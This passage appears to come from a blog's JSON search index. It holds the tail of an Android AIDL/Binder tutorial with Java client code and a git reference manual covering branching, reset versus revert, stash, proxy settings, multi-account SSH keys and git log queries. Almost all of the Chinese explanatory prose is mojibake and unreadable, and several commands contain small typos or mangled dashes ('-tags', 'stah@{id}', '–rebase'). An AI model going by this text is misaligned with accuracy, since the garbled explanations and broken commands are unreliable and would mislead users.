}; @Nullable @Override public IBinder onBind(Intent intent) { return mStub; } } public class MainActivity extends AppCompatActivity { private Button mBtnAidl; private IMyAidlInterface mIMyAidlInterface; ServiceConnection mServiceConnection = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { mIMyAidlInterface = IMyAidlInterface.Stub.asInterface(service); //åœ¨è¿™é‡Œè·å¾—è¿œç¨‹æœåŠ¡çš„proxyå¼•ç”¨ } @Override public void onServiceDisconnected(ComponentName name) { } }; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mBtnAidl = (Button) findViewById(R.id.btn_aidl); bindService(new Intent(MainActivity.this, AIDLService.class), mServiceConnection, BIND_AUTO_CREATE); mBtnAidl.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { if(mIMyAidlInterface != null){ try { String name = mIMyAidlInterface.getName(&quot;I&#39;m nick&quot;); Toast.makeText(MainActivity.this, &quot;name = &quot; + name, Toast.LENGTH_SHORT).show(); } catch (RemoteException e) { e.printStackTrace(); } } } }); } } éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œaidlä¸ä¸€å®šéå¾—å¤šè¿›ç¨‹æ‰èƒ½ç”¨ï¼ŒåŒä¸€è¿›ç¨‹ä¹‹é—´çš„ä¸åŒç»„ä»¶ä¹‹é—´ä¹Ÿèƒ½ç”¨aidlï¼Œè€Œä¸”ï¼Œframeworkä¼šåˆ¤æ–­å¦‚æœæ˜¯å½“å‰è¿›ç¨‹ï¼Œç›´æ¥è¿”å›åœ¨å½“å‰è¿›ç¨‹çš„å¼•ç”¨ã€‚ å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹è¿›ç¨‹çš„æµç¨‹ï¼šæœåŠ¡ç«¯è·¨è¿›ç¨‹çš„ç±»éƒ½è¦ç»§æ‰¿Binderç±»ã€‚æˆ‘ä»¬æ‰€æŒæœ‰çš„Binderå¼•ç”¨(å³æœåŠ¡ç«¯çš„ç±»å¼•ç”¨)å¹¶ä¸æ˜¯å®é™…çœŸå®çš„è¿œç¨‹Binderå¯¹è±¡ï¼Œæˆ‘ä»¬çš„å¼•ç”¨åœ¨Binderé©±åŠ¨é‡Œè¿˜è¦åšä¸€æ¬¡æ˜ å°„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè®¾å¤‡é©±åŠ¨æ ¹æ®æˆ‘ä»¬çš„å¼•ç”¨å¯¹è±¡æ‰¾åˆ°å¯¹åº”çš„è¿œç¨‹è¿›ç¨‹ã€‚å®¢æˆ·ç«¯è¦è°ƒç”¨è¿œç¨‹å¯¹è±¡å‡½æ•°æ—¶ï¼Œåªéœ€æŠŠæ•°æ®å†™å…¥åˆ°Parcelï¼Œåœ¨è°ƒç”¨æ‰€æŒæœ‰çš„Binderå¼•ç”¨çš„transact()å‡½æ•°ï¼Œtransactå‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šæŠŠå‚æ•°ã€æ ‡è¯†ç¬¦ï¼ˆæ ‡è®°è¿œç¨‹å¯¹è±¡åŠå…¶å‡½æ•°ï¼‰ç­‰æ•°æ®æ”¾å…¥åˆ°Clientçš„å…±äº«å†…å­˜ï¼ŒBinderé©±åŠ¨ä»Clientçš„å…±äº«å†…å­˜ä¸­è¯»å–æ•°æ®ï¼Œæ ¹æ®è¿™äº›æ•°æ®æ‰¾åˆ°å¯¹åº”çš„è¿œç¨‹è¿›ç¨‹çš„å…±äº«å†…å­˜ï¼ŒæŠŠæ•°æ®æ‹·è´åˆ°è¿œç¨‹è¿›ç¨‹çš„å…±äº«å†…å­˜ä¸­ï¼Œå¹¶é€šçŸ¥è¿œç¨‹è¿›ç¨‹æ‰§è¡ŒonTransact()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¹Ÿæ˜¯å±äºBinderç±»ã€‚è¿œç¨‹è¿›ç¨‹Binderå¯¹è±¡æ‰§è¡Œå®Œæˆåï¼Œå°†å¾—åˆ°çš„å†™å…¥è‡ªå·±çš„å…±äº«å†…å­˜ä¸­ï¼ŒBinderé©±åŠ¨å†å°†è¿œç¨‹è¿›ç¨‹çš„å…±äº«å†…å­˜æ•°æ®æ‹·è´åˆ°å®¢æˆ·ç«¯çš„å…±äº«å†…å­˜ï¼Œå¹¶å”¤é†’å®¢æˆ·ç«¯çº¿ç¨‹ã€‚ å‚è€ƒBinderå­¦ä¹ å¿ƒå¾—","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"service","slug":"service","permalink":"https://haldir65.github.io/tags/service/"}]},{"title":"gitå¸¸ç”¨æ“ä½œæ‰‹å†Œ","date":"2016-09-27T17:24:51.000Z","path":"2016/09/27/2016-09-27-git-manual/","text":"è®°å½•ä¸€ä¸‹å¸¸ç”¨gitçš„å‘½ä»¤ï¼Œä½œä¸ºæ—¥å¸¸ä½¿ç”¨çš„å‚è€ƒæ‰‹å†Œ 1. åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªé¡¹ç›®å¹¶åŒæ­¥åˆ°githubçš„è¿‡ç¨‹$ mkdir ~/hello-world //åˆ›å»ºä¸€ä¸ªé¡¹ç›®hello-world $ cd ~/hello-world //æ‰“å¼€è¿™ä¸ªé¡¹ç›® $ git init //åˆå§‹åŒ– $ touch README //åˆ›å»ºæ–‡ä»¶ $ git add README //æ›´æ–°READMEæ–‡ä»¶ $ git commit -m &#39;first commit&#39; //æäº¤æ›´æ–°ï¼Œå¹¶æ³¨é‡Šä¿¡æ¯â€œfirst commitâ€ $ git remote add origin git@github.test/hellotest.git //è¿æ¥è¿œç¨‹githubé¡¹ç›® $ git push -u origin master //å°†æœ¬åœ°é¡¹ç›®æ›´æ–°åˆ°githubé¡¹ç›®ä¸Šå» 2. å°†æœ¬åœ°git branchå’Œè¿œç¨‹github repositoryåŒæ­¥å¯è¡Œçš„æ–¹å¼ git branch --set-upstream local_branch origin/remote_branch è¿™æ ·åšå¯è¡Œï¼Œä½†å‡ºç°ä¸‹é¢çš„é”™è¯¯æç¤ºï¼Œç…§ç€æ“ä½œå°±è¡Œäº†ã€‚ $ git branch --set-upstream master origin/master The --set-upstream flag is deprecated and will be removed. Consider using --track or --set-upstream-to Branch master set up to track remote branch master from origin. ç›´æ¥æ‹¿ä¸‹é¢è¿™æ®µå°±è¡Œäº†å¦‚æœå·²ç»cloneä¸‹æ¥ï¼Œæƒ³è¦åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªå’Œè¿œç¨‹åˆ†æ”¯å¯¹åº”çš„localåˆ†æ”¯ã€‚ git branch â€“track dev origin/dev &amp;&amp; git checkout dev æœ¬åœ°åˆ›å»ºä¸€ä¸ªåˆ†æ”¯ï¼Œæ¨é€åˆ°è¿œç¨‹git checkout -b feature_branch_namegit push -u origin feature_branch_name 3. gitå¤„ç†å¤§å°å†™å­—æ¯çš„é—®é¢˜ gité»˜è®¤å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œæ‰€ä»¥ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶adapter.javaï¼Œä¸Šä¼ åˆ°githubä¹‹åè¯´ä¸å®šå°±ç»™å˜æˆäº†Adapter.javaã€‚åœ¨windowsä¸‹é¢å°†å·²ç»pushåˆ°è¿œç«¯çš„æ–‡ä»¶ï¼Œæ”¹å˜å…¶æ–‡ä»¶åçš„å¤§å°å†™æ—¶ï¼Œgité»˜è®¤ä¼šè®¤ä¸ºæ–‡ä»¶æ²¡æœ‰å‘ç”Ÿä»»ä½•æ”¹åŠ¨ï¼Œä»è€Œæ‹’ç»æäº¤å’Œæ¨é€ï¼ŒåŸå› æ˜¯å…¶é»˜è®¤é…ç½®ä¸ºå¤§å°å†™ä¸æ•æ„Ÿï¼Œæ•…é¡»åœ¨bashä¸‹ä¿®æ”¹é…ç½®ï¼š git config core.ignorecase false 4. gitè®¾ç½®ç”¨æˆ·å$ git config --global user.name &quot;name&quot; $ git config --global user.email xxx@163.com è¿™æ ·å¯ä»¥ä¸ºgitæ‰€æœ‰çš„ä»“åº“è®¾ç½®ç”¨æˆ·åï¼Œå¦‚æœæƒ³ä¸ºæŒ‡å®šä»“åº“è®¾ç½®ç”¨æˆ·åæˆ–email: $ git config user.name &quot;name&quot; $ git config user.email &quot;myEmail.awesome.com&quot; æŸ¥çœ‹å½“å‰ç”¨æˆ·åæˆ–email $ git config user.name $ git config user.email 5. è®¾ç½®ä»£ç†åªé’ˆå¯¹å½“å‰é¡¹ç›®è®¾ç½®ä»£ç† git config http.proxy socks5://127.0.0.1:1080 git config https.proxy socks5://127.0.0.1:1080 è®¾ç½®å…¨å±€ä»£ç† git config --global http.proxy socks5://127.0.0.1:1080 git config --global https.proxy socks5://127.0.0.1:1080 å–æ¶ˆè®¾ç½® git config --global --unset http.proxy git config --global --unset https.proxy å¯¹æŒ‡å®šurlè®¾ç½®ä»£ç†git config â€“global http.&lt;è¦è®¾ç½®ä»£ç†çš„URL&gt;.proxy socks5://127.0.0.1:1080 git config â€“global http.https://github.com.proxy socks5://127.0.0.1:1080 export http_proxy=socks5://127.0.0.1:8118; export https_proxy=$http_proxyç„¶ååœ¨å½“å‰shellä¸­å°±å¯ä»¥ç›´æ¥è¿›è¡Œcloneæ“ä½œäº†ï¼Œgitè¿™ç±»è½¯ä»¶ä¼šè‡ªåŠ¨è¯»å–å½“å‰ç¯å¢ƒå˜é‡ä¸­çš„http_proxyå’Œhttps_proxyå€¼ï¼Œå¹¶ä¸”ï¼Œè¿™ä¸ªç¯å¢ƒå˜é‡åªåœ¨å½“å‰shellä¸­æœ‰æ•ˆ unixå¹³å°ä¸‹ä¹Ÿå¯ä»¥è®¾ç½®å¯¹sshåè®®èµ°ä»£ç†vim ~/.ssh/config Host personal HostName github.com ProxyCommand nc -X 5 -x 127.0.0.1:1080 %h %p // è¿™ä¸ªæ˜¯åœ¨1080ç«¯å£æœ‰ä¸€ä¸ªsock5åè®®ä»£ç†çš„å‰æä¸‹ å¦‚æœè®©æ‰€æœ‰hostéƒ½èµ°ä»£ç†çš„è¯ Host * //å°±å¯ä»¥äº† 6. å¯¹ä¸Šä¸€æ¬¡commitè¿›è¡Œä¿®æ”¹(åœ¨ä¸æ·»åŠ æ–°çš„commitçš„åŸºç¡€ä¸Š)git commit --amend 7. git revertå’Œresetçš„åŒºåˆ« reset æ˜¯åœ¨æ­£å¸¸çš„commitå†å²ä¸­,åˆ é™¤äº†æŒ‡å®šçš„commit,è¿™æ—¶ HEAD æ˜¯å‘åç§»åŠ¨äº†,è€Œ revert æ˜¯åœ¨æ­£å¸¸çš„commitå†å²ä¸­å†commitä¸€æ¬¡,åªä¸è¿‡æ˜¯åå‘æäº¤,ä»–çš„ HEAD æ˜¯ä¸€ç›´å‘å‰çš„. å³resetæ˜¯é€šè¿‡ä¸€æ¬¡åå‘çš„commitæ“ä½œæ’¤é”€ä¹‹å‰çš„commitï¼Œè€Œresetåˆ™ä¼šç›´æ¥ä»æäº¤å†å²é‡Œåˆ é™¤commitã€‚å¦‚æœè¿˜æ²¡æœ‰pushï¼Œç”¨resetå¯ä»¥åœ¨æœ¬åœ°è§£å†³é—®é¢˜ï¼Œä¹‹åé‡æ–°commitå†pushã€‚å¦‚æœå·²ç»pushï¼Œå¯ä»¥è€ƒè™‘é€šè¿‡ä¸€æ¬¡revertæ¥å®ç°â€œæ’¤é”€â€çš„æ•ˆæœã€‚ è¯­æ³•ï¼š resetgit reset --hard HEAD //æœ¬åœ°ä»“åº“æ–‡ä»¶ä¿®æ”¹ä¹Ÿä¼šæ¶ˆå¤± git reset --soft HEAD //æœ¬åœ°æ–‡ä»¶ä¿®æ”¹ä¸ä¼šæ¶ˆå¤±ï¼Œç±»ä¼¼äºå›åˆ°git add ä¹‹å‰çš„çŠ¶æ€(æŠŠç»¿è‰²çš„æ”¹æˆçº¢è‰²) git reset --hard HEAD~3 //æœ€è¿‘çš„ä¸‰æ¬¡æäº¤å…¨éƒ¨æ’¤é”€ git reset --soft HEAD~ //æŠŠæœ€è¿‘ä¸€æ¬¡æœ¬åœ°æäº¤æ’¤é”€ï¼Œä¸Šæ¬¡æäº¤çš„æ–‡ä»¶ä¿®æ”¹è¿˜åœ¨ï¼Œç­‰äºå˜æˆçº¢è‰²çš„çŠ¶æ€ å¦‚ä½•æ’¤é”€æœ€è¿‘ä¸€æ¬¡æœ¬åœ°æäº¤ $ git commit -m &quot;Something terribly misguided&quot; # (1) $ git reset HEAD~ # (2) &lt;&lt; edit files as necessary &gt;&gt; # (3) $ git add ... # (4) $ git commit -c ORIG_HEAD # (5) ORIG_HEADæ„æ€æ˜¯æŠŠä¸Šä¸€æ¬¡çš„commit messageå¸¦ä¸Šï¼ŒåŒæ—¶æä¾›ä¸€ä¸ªeditorä¾›ä¿®æ”¹ revertgit revert c011eb3c20ba6fb38cc94fe //ä¹‹ååœ¨åˆ†æ”¯å›¾ä¸Šå°±èƒ½çœ‹åˆ°ä¸€ä¸ªæ–°çš„åå‘çš„commitï¼Œpushå³å¯ã€‚ 8. åˆ‡åˆ†æ”¯, åˆ é™¤åˆ†æ”¯æœ¬åœ°æ–°å»ºåˆ†æ”¯ git checkout -b &lt;branchName&gt; å°†è¿™æ¡åˆ†æ”¯ä¸è¿œç¨‹åŒæ­¥çš„æ–¹å¼ git branch --set-upstream &lt;laocalBranchName&gt; origin/&lt;RemoteBranchName&gt; // æˆ–è€… git branch -u origin/dev ç›´æ¥ä»è¿œç¨‹ä»“åº“åˆ‡ä¸€ä¸ªåˆ†æ”¯å‡ºæ¥å¹¶ä¿æŒåŒæ­¥çš„æ–¹å¼ git checkout -b &lt;branchName&gt; origin/&lt;branchName&gt; git checkout --track origin/dev åˆ é™¤è¿œç¨‹åˆ†æ”¯: git push origin --delete &lt;branchName&gt; åˆ é™¤è¿œç¨‹tag git push origin --delete tag &lt;tagName&gt; é¡ºä¾¿è¯´ä¸€ä¸‹æ‰“tagï¼Œè¿™ä¸ªå®åœ¨å¤ªç®€å• git tag //çœ‹ä¸‹å½“å‰ä»“åº“æœ‰å“ªäº›tags git tag myTag // åœ¨å½“å‰headæ‰“ä¸€ä¸ªmyTagçš„æ ‡ç­¾ git push origin myTag //åˆšæ‰é‚£ä¸ªtagè¿˜åªæ˜¯åœ¨æœ¬åœ°ï¼Œéœ€è¦æäº¤åˆ°è¿œç¨‹ git checkout myTag //æ‰“tagçš„å¥½å¤„å°±åœ¨äºåŸ‹ä¸‹ä¸€ä¸ªé‡Œç¨‹ç¢‘ï¼Œä½ éšæ—¶å¯ä»¥å›åˆ°å½“æ—¶çš„çŠ¶æ€ git tag -d myTag //åˆ é™¤è¿™ä¸ªtagä¹Ÿå¾ˆç®€å• git tag -a myTag adjksdas31231//å‡å¦‚å½“å‰headä¸åœ¨æƒ³æ‰“çš„ä½ç½®ï¼Œæ‰¾åˆ°æƒ³æ‰“çš„ä½ç½®çš„logï¼Œç…§ç€æ‰“å°±å¥½ git push origin -tags //å°†æœ¬åœ°æ‰€æœ‰æ ‡ç­¾ä¸€æ¬¡æ€§æäº¤åˆ°gitæœåŠ¡å™¨ git ls-remote --tags origin //æŸ¥çœ‹è¿œç¨‹ä»“åº“æ‰€æœ‰çš„tags 9. pullå’Œrebaseçš„åŒºåˆ«pull = fetch +mergeï¼Œä¼šç”Ÿæˆæ–°çš„æäº¤ Mergeå¥½åœ¨å®ƒæ˜¯ä¸€ä¸ªå®‰å…¨çš„æ“ä½œã€‚ç°æœ‰çš„åˆ†æ”¯ä¸ä¼šè¢«æ›´æ”¹ï¼Œé¿å…äº†rebaseæ½œåœ¨çš„ç¼ºç‚¹ git pull â€“rebase = git pull -r git merge â€“no-ff //èƒ½å¤Ÿ fast forwardçš„mergeï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯å¸Œæœ›èƒ½å¤Ÿä¿ç•™å†å²git merge â€“squash //è¦åˆè¿‡æ¥çš„åˆ†æ”¯ä¸Šçš„æäº¤ä¹±ä¸ƒå…«ç³Ÿï¼Œç»Ÿä¸€åšæˆä¸€ä¸ªcommitï¼Œè¿™é‡Œéœ€è¦åšä¸€æ¬¡æäº¤ã€‚è¿™é‡Œå…¶å®æ˜¯èˆå¼ƒäº†å…¶ä»–åˆ†æ”¯ä¸Šçš„commit historyï¼Œç›´æ¥å°†å¯¹æ–¹çš„æ”¹åŠ¨è®°å½•æ‹¿è¿‡æ¥äº†ï¼Œæ‰€ä»¥éœ€è¦åšä¸€æ¬¡æäº¤ã€‚ æŠŠå¤šä¸ªæœ¬åœ°æœªpushçš„commitåˆå¹¶æˆä¸€ä¸ª: git rebase -i //è¿›å…¥viæ¨¡å¼ï¼ŒæŒ‰ç…§æç¤ºç¼–è¾‘æ–‡æœ¬å³å¯ã€‚å®Œæˆåä¼šè‡ªåŠ¨è¿›å…¥viæ¨¡å¼ï¼Œè¦æ±‚å¯¹è¿™ä¸€ä¸ªåˆå¹¶çš„commitçš„messageè¿›è¡Œä¿®æ”¹ã€‚è¿™ä¸ªviæ¨¡å¼é‡Œé¢æœ‰é’ˆå¯¹æ¯ä¸€æ¬¡commitçš„æ“ä½œé€‰é¡¹: Commands:p, pick = use commite, edit = use commit, but stop for amendings, squash = use commit, but meld into previous commit# If you remove a line here THAT COMMIT WILL BE LOST.However, if you remove everything, the rebase will be aborted.æ‰€ä»¥å¦‚æœæƒ³è¦æŠŠæœ¬åœ°è¿™å››æ¬¡éƒ½åˆå¹¶åˆ°æœ€åä¸€æ¬¡ï¼Œæœ€åä¸€ä¸ªä¿®æ”¹æˆpick ï¼Œå…¶ä½™ä¿®æ”¹æˆsquasheditå¯ä»¥æ‹†åˆ†ï¼ŒæŠŠä¸€æ¬¡commitæ‹†æˆä¸¤ä¸ªç”šè‡³å¯ä»¥åˆ é™¤è¿™å‡ æ¬¡comimtä¸­çš„æŸä¸€æ¬¡æäº¤ git rebase -i HEAD~4 //è¿˜å¯ä»¥å¸¦ä¸Šä¸€äº›å‚æ•°ï¼Œæ¯”å¦‚å¾€å‰æ•°4æ¬¡commitä½œä¸ºbaseï¼Œ iæ˜¯interactiveçš„æ„æ€ã€‚ 10. rebaseå’Œcherry-pickrebaseä¸ä¼šç”Ÿæˆæ–°çš„æäº¤ï¼Œè€Œä¸”ä¼šä½¿å¾—é¡¹ç›®æäº¤å†å²å‘ˆç°å‡ºå®Œç¾çš„çº¿æ€§ã€‚ä½†æ³¨æ„ä¸è¦åœ¨å…¬å…±çš„åˆ†æ”¯ä¸Šä½¿ç”¨ 11. gitignoreæ–‡ä»¶å†™æ³•å‚è€ƒrepo # å¿½ç•¥æ‰€æœ‰ä»¥ .cç»“å°¾çš„æ–‡ä»¶ *.c # ä½†æ˜¯ stream.c ä¼šè¢«gitè¿½è¸ª !stream.c # åªå¿½ç•¥å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„TODOæ–‡ä»¶, ä¸åŒ…æ‹¬å…¶ä»–æ–‡ä»¶å¤¹ä¸‹çš„TODOä¾‹å¦‚: subdir/TODO /TODO # å¿½ç•¥æ‰€æœ‰åœ¨buildæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ build/ # å¿½ç•¥ doc/notes.txt, ä½†ä¸åŒ…æ‹¬å¤šå±‚ä¸‹.txtä¾‹å¦‚: doc/server/arch.txt doc/*.txt # å¿½ç•¥æ‰€æœ‰åœ¨docç›®å½•ä¸‹çš„.pdfæ–‡ä»¶ doc/**/*.pdf # è®©ignoreæ–‡ä»¶ç«‹å³ç”Ÿæ•ˆçš„æ–¹æ³•ï¼ˆå¦‚æœä¸è¯¥ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸œè¥¿å·²ç»ä¸Šä¼ äº†ï¼Œæœ¬æ¬¡æäº¤ä¼šæŠŠè¿™äº›ä¸è¯¥ä¸Šä¼ çš„ä¸œè¥¿ä»æœåŠ¡å™¨åˆ æ‰ï¼‰ git rm -r --cached . git add . git commit -m &quot;.gitignore is now working&quot; 12. git stashå¸¸ç”¨å‘½ä»¤ git stash //ä¿å­˜ä¸‹æ¥ï¼Œå‹è¿›ä¸€ä¸ªæ ˆï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯å…ˆè¿›åå‡ºäº† git stash pop //æ¨å‡ºä¸€ä¸ªæ ˆ git stash save -a &quot;message to add&quot; // æ·»åŠ ä¸€æ¬¡stashï¼Œæ‰“ä¸Šæ ‡è®° git stash list //å±•ç¤ºå½“å‰ä»“åº“æ‰€æœ‰çš„è¢«stashçš„å˜æ›´ä»¥åŠå¯¹åº”çš„idï¼Œè®°å¾—è¿™ä¸ªä¸æ˜¯è·Ÿç€branchèµ°çš„ git stash drop stah@{id} // ä»stashçš„Listä¸­åˆ é™¤æŒ‡å®šçš„æŸä¸€æ¬¡stash git stash apply &lt;stash@{id}&gt; //åº”ç”¨æŸä¸€æ¬¡çš„stash git stash clear// ä¸€æ¬¡æ€§åˆ é™¤stash Listä¸­æ‰€æœ‰çš„item 13. å¼ºæ¨è°¨æ…ä½¿ç”¨ # Be very careful with this command! git push --force 14.æ—¢ç„¶æ˜¯shellç¯å¢ƒï¼Œé‚£å½“ç„¶å¯ä»¥å†™bash è„šæœ¬ git add . &amp;&amp; git commit -m â€œstuffâ€ &amp;&amp; git push ä¸€éƒ¨æå®šï¼Œå‰ææ˜¯æ¯ä¸€æ­¥éƒ½å¾—æˆåŠŸï¼ŒåŸç†å°±æ˜¯bashè„šæœ¬çš„&amp;&amp;å’Œ||æ“ä½œç¬¦ã€‚15. git-error-please-make-sure-you-have-the-correct-access-rights-and-the-repositoæ€»ä¼šæœ‰ä¸å°å¿ƒçš„æ—¶å€™æŠŠæœ¬åœ°çš„sshkeyå¹²æ‰äº†ï¼Œè§£å†³æ–¹æ³•å°±æ˜¯æœ¬åœ°ç”Ÿæˆsshkeyï¼Œç„¶åç²˜è´´åˆ°ä½ çš„githubæˆ–è€…gitlabç½‘ç«™ä¸Š ssh-keygen ## è¿™ä¸ªåŸºæœ¬ä¸Šåœ¨ç½‘ä¸Šéƒ½èƒ½æ‰¾åˆ°ï¼Œå¯ä»¥ä¼ å‚æ•°ï¼Œç”Ÿæˆçš„æ–‡ä»¶åï¼Œå¯†ç ä»€ä¹ˆçš„cat ~/.ssh/id_rsa.pub | clip ## ä¸­é—´çš„ç®¡é“æ˜¯æŠŠå†…å®¹æåˆ°å‰ªåˆ‡æ¿ä¸Šï¼Œclipæ˜¯windowsä¸Šçš„å‘½ä»¤å»ç²˜è´´å§ ä¸€å°ç”µè„‘ä¸Šå­˜å‚¨ä¸¤ä¸ªgithubè´¦å·çš„sshçš„æ–¹å¼ $ cd ~/.ssh$ ssh-keygen -t rsa -C â€œyour_email@associated_with_githubPersonal.comâ€ save it as id_rsa_personal when prompted $ ssh-keygen -t rsa -C â€œyour_email@associated_with_githubWork.comâ€ save it as id_rsa_work when prompted ssh-keygen -R â€œ[x.x.x.x]:22â€ //ä¹‹å‰é€šè¿‡ssh-kengenè®°ä½çš„ï¼Œè¿™ä¸ªRæ˜¯removeçš„æ„æ€ ç”±æ­¤åˆ›å»ºå››ä¸ªæ–‡ä»¶ï¼šid_rsa_personalid_rsa_personal.pub ## è¿™é‡Œé¢çš„å†…å®¹æ˜¯è¦ç²˜åˆ°githubè´¦æˆ·settingé‡Œé¢çš„id_rsa_workid_rsa_work.pub touch configï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ #githubPersonal Host personal HostName github.com User git IdentityFile ~/.ssh/id_rsa_personal # githubWork Host work HostName github.com User git IdentityFile ~/.ssh/id_rsa_work å¦å¤–,ç¡®ä¿åªæœ‰owneræœ‰è¯»å†™æƒé™chmod 600 ~/.ssh/config error:Could not open a connection to your authentication agent. ssh-agent bash ssh-add -Dä¸€å°ç”µè„‘ä¸ŠåŒæ—¶è¦æ·»åŠ githubå’Œgitlabçš„æƒé™ï¼Œæˆ–è€…ä¸€å°ç”µè„‘ä¸Šè¦åŒæ—¶æ·»åŠ ä¸¤ä¸ªgithubè´¦æˆ·çš„æƒé™ ssh-keygen -t rsa -C â€œyour_email@youremail.comâ€œ$ ssh-add id_rsa_personal$ ssh-add id_rsa_workssh-add -lssh -Tv personalssh -Tv workä¼¼ä¹è¿™æ ·å°±è¡Œäº†ï¼Œå°±å¯ä»¥ç”¨git@xxxxå»cloneå¹¶ä¸”pushäº†ï¼ˆè®°å¾—åœ¨githubè´¦æˆ·çš„settingé‡Œé¢æŠŠ.pubæ–‡ä»¶é‡Œé¢çš„å†…å®¹ç²˜è´´è¿›å»ï¼‰ å¦‚ä½•é¿å…æ¯æ¬¡éƒ½å¾—è¾“å…¥ssh-add id_rsaxxxçš„ç°è±¡æ‰‹åŠ¨å°†cloneä¸‹æ¥çš„Gitä»“åº“çš„originæ”¹æˆä¸‹é¢è¿™ç§æ˜¯å¯ä»¥çš„ ç„¶åæ¯æ¬¡cloneçš„æ—¶å€™ï¼Œä¸èƒ½ç”¨ git clone git@github.com:gothinkster/node-express-realworld-example-app.gitgit clone git@personal:gothinkster/node-express-realworld-example-app.git ### æ”¹æˆè¿™æ ·å°±å¥½å•¦ Error: Permission denied (publickey)çš„è§£å†³æ–¹æ¡ˆssh -vT git@github.com ## ä¼šè¾“å‡ºè¯¦ç»†çš„ä¿¡æ¯multiple github accountDigital oceanå…³äº.ssh/configæ–‡ä»¶çš„è§£é‡Šéå¸¸å¥½ è¯¦ç»†çš„å…³äºå¦‚ä½•ç”¨sshç®¡ç†å¤šä¸ªgithubè´¦æˆ·çš„æ•™ç¨‹ 16. ç©ºç›®å½•æ¨é€åˆ°è¿œç«¯å¸¸å¸¸åœ¨nodeé¡¹ç›®ä¸­çœ‹åˆ°ä¸€ä¸ªstaticæ–‡ä»¶å¤¹ï¼Œé‡Œé¢åªæœ‰ä¸€ä¸ª.gitkeepæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶çš„æ„æ€æ˜¯ï¼Œå°±ç®—è¿™ä¸ªç›®å½•æ˜¯ç©ºçš„ï¼Œä¹Ÿå¾—æ¨é€åˆ°è¿œç«¯ã€‚ 17. staleå’Œpruneçš„æ¦‚å¿µprune(staleçš„æ¦‚å¿µ - ä¸€ä¸ªåŸæœ¬åˆ†æ”¯å«åšdevï¼Œè¿œç¨‹å«origin/devï¼Œå¦‚æœåˆ é™¤äº†devï¼Œåˆåˆ°masterï¼Œæäº¤åˆ°origin/masterä¹‹åï¼Œè¿œç¨‹çš„origin/devå°±æˆäº†staleçš„äº†)man pruneæ˜¯è¿™ä¹ˆè¯´çš„ï¼š Deletes all stale tracking branches under .These stale branches have already been removed from the remote repositoryreferenced by , but are still locally available in â€œremotes/â€œ. pruneçš„è§£é‡Š 18. git clean -fdIf you just clean untracked files, run git clean -f.If you want to also remove directories, run git clean -f -d.If you just want to remove ignored files, run git clean -f -X.If you want to remove ignored as well as non-ignored files, run git clean -f -x. ä¸€äº›çœ‹ä¸Šå»å¾ˆç¥å¥‡çš„æ“ä½œgit clone â€“depth=50 â€“branch=branchName https://github.com/XXX/XXX.git myFolder/theNameIwantItToBe git -c core.quotepath=false push â€“progress â€“porcelain origin refs/heads/master:master // ideaå†…ç½®git pushæ“ä½œå®é™…æ‰§è¡Œäº†è¿™ä¸€è¡ŒæŒ‡ä»¤ git fetch -v git submodule update â€“init ## æ¯”å¦‚è¯´shadowsockså·¥ç¨‹ æˆ‘ä¹Ÿæ˜¯æ‰å‘ç°ï¼Œwindowsä¸‹çš„git bashé›†æˆäº†opensshï¼Œcurlï¼Œå¥½ç”¨çš„ä¸è¡Œ git branch -r æœ‰æ—¶å€™ä¸æ˜¾ç¤ºæ‰€æœ‰çš„remote branchï¼Œäº²æµ‹ï¼Œremoveæ‰originï¼Œé‡æ–°æ·»åŠ ç„¶åfetchå°±å¥½äº† git ç»Ÿè®¡commiteräººæ•° git log â€“pretty=â€™%aNâ€™ | sort -u | wc -lgit log â€“oneline | wc -l ### æäº¤æ€»æ•°ç»Ÿè®¡git log â€“pretty=â€™%aNâ€™ | sort | uniq -c | sort -k1 -n -r | head -n 5 ###æŸ¥çœ‹ä»“åº“æäº¤è€…æ’åå‰ 5 æŸ¥çœ‹æœ€è¿‘ä¸€æ¬¡commitéƒ½æ”¹äº†ä»€ä¹ˆ git diff HEAD~1 HEAD git log git log â€“pretty=format:â€%cn committed %h on %cdâ€git log â€“onelinegit log â€“stat ## æ˜¾ç¤ºå‡ºæ¯ä¸€æ¬¡commitçš„ï¼Œä»¥åŠæ¯ä¸€æ¬¡commitéƒ½æ”¹äº†å“ªäº›æ–‡ä»¶git log -v ##è¿™ä¸ªæ›´å•°å—¦ ## æ¯”statå¤šå‡ºäº†æ¯æ¬¡æ›´æ”¹ä¹‹åä¿®æ”¹çš„æ–‡ä»¶å†…å®¹git log â€“graph â€“oneline â€“decorategit log â€“pretty=format:â€%cn committed %h on %cdâ€ | awk â€˜{ print $8}â€™ | sort -n ##ç»“åˆawkå¯ä»¥çœ‹åˆ°æœ€æ™šå‡ ç‚¹commitï¼Œæ¯”å¦‚å‡Œæ™¨1ç‚¹è¿˜åœ¨commitçš„.formaté‡Œé¢çš„å‚æ•°åœ¨man git log pageå¯ä»¥æ‰¾åˆ°git log â€“after=â€2014-7-1â€ â€“before=â€2014-7-4â€ ## è¿˜å¯ä»¥æŸ¥çœ‹æŸä¸ªæ—¥æœŸä¹‹é—´æäº¤çš„ä¸œè¥¿git log â€“author=â€Johnâ€git log â€“author=â€John|Maryâ€ ## Johnæˆ–è€…Maryçš„git log â€“grep=â€JRA-224:â€ ## ä»commit messageé‡Œé¢æŸ¥æ‰¾git log â€“ foo.py bar.py ## æŸ¥çœ‹è·Ÿè¿™å‡ 